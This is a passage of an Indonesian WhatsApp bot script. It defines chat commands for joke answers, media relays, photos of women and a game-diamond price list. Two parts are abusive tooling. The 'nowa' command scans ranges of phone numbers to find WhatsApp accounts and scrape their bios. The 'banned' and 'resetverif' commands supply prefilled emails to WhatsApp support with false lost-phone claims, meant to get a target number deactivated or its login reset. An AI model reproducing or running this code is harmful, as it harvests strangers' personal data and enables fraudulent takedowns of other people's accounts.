"mediaKey": "wnhI3PodfZqLKQbbEBQFYBxlb7n1WBhwWbPfuPQJm/8=",
"fileName": "Belajar Bersama_1.11.apk",
"fileEncSha256": "LAmKijY7XCKJrONV0cBXPiCNVYJdYLMjMOsi+q4pd2g=",
"directPath": "/v/t62.7119-24/34960356_543134977691326_1792059771773909536_n.enc?ccb=11-4&oh=01_AdQHN60wPp2-oLvINncKbeOse99hDWzyfjN2G4S0G4kr1g&oe=63C591FA",
"mediaKeyTimestamp": "1671207354",
"caption": "Hallo Kak Aplikasi Ini Adalah Buatan Asli Hw Mods Aman Dan Terpercaya Selamat Belajar ❤️",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply('sukses Kirim Script')
}
break
//=================================================//
case 'infoamgeekz': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

📮 _*Syarat & Ketentuan*_

1. _Fitur lupa password sudah bisa digunakan jadi pastikan email aktif kalian sudah di tambahkan di panel kami._
2. _Selalu backup data_
3. _Jangan beritahukan user password kepada orang lain ( kami tidak bertanggung jawab dengan hal ini )_

_*sebelumnya kami mengalami kasus dimana user kami menjual akunnya ke orang lain dan selang beberapa hari meminta kami untuk reset password hal ini membuat nama panel kami dibilang scam untuk menanggulangi hal ini kami tidak akan lagi membantu melakukan reset password.*_`)
}
break
//=================================================//
case 'bagaimanakah':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'cecan1': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6c/59/ee/6c59ee71dd001504309d8fa999419765.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/eb/3d/c2/eb3dc2c7a69abf471127fac837c0ac90.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan3': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e5/5a/20/e55a20a9c762d5578884af81e33ecfff.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/62/b6/37/62b6370726160df92fa26d51df2bb9f5.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan5': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/af/ef/ca/afefcafc1ad008cee1021602c05f5986.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan6': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/36/8d/f1/368df1b6fc71343febf89b698d0c1668.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan7': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/db/c7/40/dbc7403ea7d36e5a192008d777293b02.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan8': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/f6/19/b0/f619b02f2ec4b28c152dc0ef02a671f2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan9': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b6/7d/15/b67d154789da7138e80179bb03651aec.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan10': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/97/c8/46/97c8460a8e5217239149dd9fa1ca81c3.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan11': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/bd/fd/94/bdfd9417121ccbf52cb9ba83156b005f.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan12': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/e1/37/5b/e1375b427cf9e0c6710e1965490f4057.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan13': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/39/8e/4b/398e4bb0e7ab5e55121b03a24352d0bf.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan14': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/7b/5b/a3/7b5ba32bb7ba1303a824643fdb00be4e.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan15': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/41/5a/9d/415a9dd402305fdae61e081b906bcfa6.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan16': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/72/8e/e4/728ee4c55d857d6c90b39c27a42c9ac9.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan17': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/b8/36/65/b83665498cdc46ba542739e56c43b36a.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan18': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/59/25/07/592507dc13a8355e661eaeb73c442c6c.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan19': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/30/64/90/30649018b4ba4813d03e4c846d8d1ef2.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
case 'cecan20': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: { url:'https://i.pinimg.com/736x/6e/89/57/6e89574602653d1e88227658ff206d82.jpg'},  caption: `CANTIK GA ?` }, { quoted:m })
}
break
//=================================================//
case 'detectadmin': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) return groupon(from)
if (!isAdmins) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
m.reply('Succes menyalakan detect admin di group ini 🌷')
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Mati')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Succes mematikan detect admin di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

//=================================================//
case 'nowa': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await haikal.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
//=================================================//
case 'assalamualaikum': case 'p': {
m.reply(`Waalaikumsalam`)
}
break
//=================================================//
case 'banned': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `BANNED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'resetverif': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
headerType: 1
}
haikal.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
//=================================================//

case 'like': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AtmBPBpHd16nNrsFMNKrVLgQEnQEDWrgecBJWkHtEYFq.enc",
"mimetype": "audio/aac",
"fileSha256": "SsBrUcYQsl7JS8B6z7p9OrUeWouuuRKm2D718TKTG/0=",
"fileLength": "5242365",
"seconds": 426,
"ptt": true,
"mediaKey": "LcHw58TFaGzUNFAUY4KMeEuhA/4r/l46wA124SB2Vvo=",
"fileEncSha256": "MqZczPvOHGESUTlF9eKkRzMVWR3dHsyis9HTyIr0M+4=",
"directPath": "/v/t62.7114-24/23652022_207521381796749_2175437773878351384_n.enc?ccb=11-4&oh=01_AdTverMBpW-pgpOiREqltNn14uv6kyGuhf7ngKxZUlx_3g&oe=63E8D6D5&_nc_hot=1673611974",
"mediaKeyTimestamp": "1673611935",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break

case 'oke': case 'anjing': case 'anjay': case 'ajg': case 'thx': case 'thanks' : case 'makasih': case 'mksh': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvpcNTnCiFuwMOTF_4M-_pQul6OGHttQt9mT-ELnqRGi.enc",
"mimetype": "audio/mpeg",
"fileSha256": "voiw4MmXNUd1ZZ6Phtz5wuIuVVteGLpHbM25ELh8M3I=",
"fileLength": "590156",
"seconds": 38,
"ptt": true,
"mediaKey": "pTTV3QeU+tHQ0QxSLQcxT+N8Z4aNDdNGQEWD3Ek5BAk=",
"fileEncSha256": "7H3yGsETGrNYNXKOiRRrv7sJkh72KmHlqc6fr4iwMlU=",
"directPath": "/v/t62.7114-24/30633446_677011363892883_1835941796065619727_n.enc?ccb=11-4&oh=01_AdRoORpHvya9BbHrVj0kEow0V5brcP3h3uTX7VgNUFtIUw&oe=63D1F365",
"mediaKeyTimestamp": "1672112575",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break


case 'lagu': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ao0VjkFEicTiR4sSao95tJtfGf1GcOBi1D3A1HmJ2NBb.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jYomfG7vWpwdHdyEWMcNXWcQ4RK4zJTrk7MOXoOWbW0=",
"fileLength": "39770009",
"seconds": 3111111111,
"ptt": true,
"mediaKey": "IkTeNGd3eQ8Zgyp45Ns3ocu0umwHzNN1ohMXMDx9LnU=",
"fileEncSha256": "vtCEyCO0AsoAXepMJ0YlZZPTTzBajpEkLUVIXUwGPJs=",
"directPath": "/v/t62.7114-24/32700763_1139228503444236_568972103735624216_n.enc?ccb=11-4&oh=01_AdR_jymBdTiN8hGuzYpBmdxhFHMnAm7jAzZHykJanR5KBA&oe=63D648B3",
"mediaKeyTimestamp": "167240245908",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'diamond': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist DM Mobile Legends By Shuro Store* :

14💎(13+1) Rp3.800,00
56💎(51+5) Rp14.500,00
86💎(78+8) Rp21.700,00
114💎(104+10) Rp27.900,00
172💎(156+16) Rp41.500,00
257💎(234+23) Rp60.600,00
285💎(260+25) Rp67.000,00
344💎(312+32) Rp80.500,00
429💎(390+39) Rp99.700,00
514💎(468+46) Rp119.000,00
570💎(519+51) Rp134.500,00
600💎(546+54) Rp138.800,00
720💎(638+82) Rp161.800,00
878💎(781+97) Rp198.500,00
963💎(859+104) Rp218.000,00
1.163💎(1041+122) Rp265.600,00
2.195💎(1860+335) Rp472.000,00
2.901💎(2485+416) Rp629.300,00
3.688💎(3099+589) Rp785.500,00
4.394💎(3724+670) Rp942.900,00
5.532💎(4649+883) Rp1.180.000,00

Noted :
Order dengan memberikan ID+Server
Silahkan Hubungi Owner Di Bawah

Haikal-
Wa.me/6281214281312?text=Bang+Beli+Diamond

Buaya Bayangan-
Wa.me/62895422836123?text=Bang+Beli+Diamond`)
}
break
//=================================================//

case 'asupan1': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AoN3Abh6GK2kqg9-2ec38RBmxDLpDI8nsqr1cnKyeZO_.enc",
"mimetype": "video/mp4",
"fileSha256": "ZWcRwuTMHxit/cPV5AqkSkLzQty+iSA+sK+AS+uihCo=",
"fileLength": "2698963",
"seconds": 11,
"mediaKey": "E1AkiF4aKog2Y2QxwP500iE3Duh5d0seuScJYlloQTs=",
"height": 1024,
"width": 576,
"fileEncSha256": "Jtf7kqgzYKASn40g/pfGiouncinGuM9CJecC8x1An6g=",
"directPath": "/v/t62.7161-24/21323718_3165337010424334_2222204692383853765_n.enc?ccb=11-4&oh=01_AdSjm4Sg-kTU2_itIi3Xv5KiWbRe16_tMsmQr3RyUN3hpA&oe=63E2AB40",
"mediaKeyTimestamp": "1673208561",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAADAAIEBQEBAQEBAQAAAAAAAAAAAAAAAAABAgP/2gAMAwEAAhADEAAAAOBsz7ZTwdfknnl4zqUXb1crfWMcVGcimu816II2VqeANntMazD2dEBDsJpLMySZJWRf/8QAIxABAAIDAAICAQUAAAAAAAAAAQACAxEhBBIxURATImFiof/aAAgBAQABPwC37rcmPFQOkzUKBavBiIu5vk5MNd3Yal6++KxHYwNk1PGD1ViasJMemeRT0ypMdN41Puat9Ew69Zw+ZiuM8zH71MhPHd1Sfo/2mJ5Gz9TGrfZKW2fxLUrRWr8s3MdWqxouufMxY/WumKHCWZ7QV7/kxrvdo3hbax7ubZ7wtqN5R4zfzNwFlAQ52ZFLJuYV7N8fx//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQIBAT8AYsgshCFLkiu//8QAHBEAAgICAwAAAAAAAAAAAAAAAREAEAIhIEGB/9oACAEDAQE/ABDTeI17DTnVLfL/2Q==",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan2': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjB2biThIRMsYiC3qbBTg2n-UwDBEwt5vcD0_8o7Neqq.enc",
"mimetype": "video/mp4",
"fileSha256": "J9hVCEtwINAQz1MeDmvjE5NwnAfUB5hrkBkCDzYt0qA=",
"fileLength": "2104648",
"seconds": 10,
"mediaKey": "G2amDbQm8Ncy7Og+oJt7UAOqwVtixrUhpgfzaVvQSls=",
"height": 1024,
"width": 576,
"fileEncSha256": "CV3CfkLvYtg+WwTRe6RGV3XLfg9S9q2ZYH9mTWJb/6M=",
"directPath": "/v/t62.7161-24/40776347_3261745360756260_7644823307622382395_n.enc?ccb=11-4&oh=01_AdSnOIcZuM7Rkm-WvsodVbYWeh9Q90IQ2w5si5cfwBZ5eA&oe=63E28579",
"mediaKeyTimestamp": "1673208562",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAEAAMFAgEBAQEBAQEAAAAAAAAAAAAAAAMCBAEA/9oADAMBAAIQAxAAAAAqOOAC+vytU5pRVBvBozlX+39P3EM84lpoBpdY6jX64zyrFkqx+XpSPCiK1PnDcTPCWyIpr5PWWmT0/wD/xAAkEAACAwACAQIHAAAAAAAAAAABAgADESExExASBCIyQVFhgf/aAAgBAQABPwBFbiARgqjWIhUHmOMnEWfGW+JAB2Yp81QXNYDRAl574EYZ6IBLaHtvIP0rKKPaolqMF2WgzTEGQcOS32iWB8GR11SJYvezx/uV43UesNWRnMpUqOY0v76nEqbCIp9y8mE4v9jHgS5hpE4/MQyo6p0wupIUGOehLz859FMoQlDvRlQAcjIcEvQNpE8TStFHcVsiOPK0Z47TZ//EAB0RAQACAgIDAAAAAAAAAAAAAAEAAgMRICIhMUH/2gAIAQIBAT8AFtYJYD7BmLYsvj6wsHuUatjcueCGOsxncjfcS23XD//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAgMREiEQE0Ex/9oACAEDAQE/AFtjp29LlFXlsqSUhCmntfT1sxTIJ5HWOMkJJEuP/9k=",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan3': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgzxUvp5P4ApOkybMWZVbzoOmD_e_Srw76xf1ngWs999.enc",
"mimetype": "video/mp4",
"fileSha256": "hmr9crxngcE+iYuJKKE/sKCeAyPNYCCPdu9Dtn4XtWY=",
"fileLength": "1302167",
"seconds": 16,
"mediaKey": "iozgZ7KtLP0i9AKTZ1uF8bIQh+kbM7NzZAaeFg2rQBU=",
"height": 1024,
"width": 576,
"fileEncSha256": "YeCW4WTRoePtPdWeTdk/+vGtVFwXEuwT2rOzWqHVu2U=",
"directPath": "/v/t62.7161-24/31804582_506314984701916_8194635137770660774_n.enc?ccb=11-4&oh=01_AdT0ZBpZyQ3oHhpqS8r5gS9q_7lJtbV562OcEezFRO_dDA&oe=63E29D93",
"mediaKeyTimestamp": "1673208563",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAADAAIEAQUBAQEBAQEAAAAAAAAAAAAAAAIDAQAE/9oADAMBAAIQAxAAAADNftjU6S/ZmO5qfp27Q+jlezCBObjvUVVegpaM5IfHUuN9VxtlU+1Guyd5I27lkrMKycP/xAAgEAADAQACAQUBAAAAAAAAAAAAAQIRITEQAxIiM0FC/9oACAEBAAE/AEsPwU/FmcFIwWDWLT20udKnUVNr+j5mF5kJ9NlTHtzeiWqhMtGH6j1frazSlV+mtWEwonEX4XZKXYyui/CZI2imi/CZL4KZdYVaZoq6IfBbxaVWlM0Vcomh0PtlM0//xAAYEQADAQEAAAAAAAAAAAAAAAAAARECEP/aAAgBAgEBPwCifGLiRETmc0aRYZYz/8QAHREAAQMFAQAAAAAAAAAAAAAAAQADEQIQEiExQf/aAAgBAwEBPwDGVUL1XM2lOu4jXSqXDGwh6nRwoL//2Q==",
}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan4': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/ArGrKg-I9gbSJ218VTt8s_VNgc55iO213I8grKQBwJQe.enc",
"mimetype": "video/mp4",
"fileSha256": "9NqCmrU/Xbs38/M3F8NIWd76yJYm71uYG7ElwcH3cEg=",
"fileLength": "3660168",
"seconds": 10,
"mediaKey": "KHD2SrjuGxGTyZZB2yYdbT4dXAxV89SxYwwlu9Ol310=",
"height": 1024,
"width": 576,
"fileEncSha256": "nhBrj+p1u/OEVDNaLCRzitBTI4nQYbqKuYRM21gLjak=",
"directPath": "/v/t62.7161-24/34812918_670829518070021_5630485054193330664_n.enc?ccb=11-4&oh=01_AdQomc5LHAVFrOD47GBDUWHTeQbESAS54ZknV-fmJUEyZQ&oe=63E2951B",
"mediaKeyTimestamp": "1673208563",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEBAQADAQAAAAAAAAAAAAAEBQABAgMGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAACYrUe6ePXJtNT08+TbeOl2njFnTlA8cNVYKru0D6P5g3m+dWi5zp7mXG7lyfg/rKRmzCxbTZk7S//EACcQAAICAgEDAwQDAAAAAAAAAAECAAMEERITIkEhMVIUYWJxJFFy/9oACAEBAAE/ACA1aGIoexO2FbVewo41EBsye6Ha3NxPmcrfnK6QUQEeqyqhVcHUyOpTZZ2Hi8wqHa4uQdTLqau9vSdX8Ytdx9mErryOQ71l3NBuy1NSp1dSEdD+hMxkU6d0nOr5pKXAqrJBPKC1QygAncvpN1tpO9L7TBJTKKzKJsyn/c+mT7zaitADKdK6Q13WWvxICwBqM/TQK92W/D+50L/ksour6wrImTZXUvJlG/Ept3QH+05NkZ6xH6GXZ/qdWKhB6sfd7BS3gTnxpasHxqY749ZU9vMTMNTuWXXLcFo0IrBUHt+pjZGiAVWC5l23oQIXezZFVejG2j7NYE5/jEBa3UvQoBwMQ/xiPOpjZBFoRh6S242WFfHKCf/EABsRAAMBAAMBAAAAAAAAAAAAAAABAiEREjFB/9oACAECAQE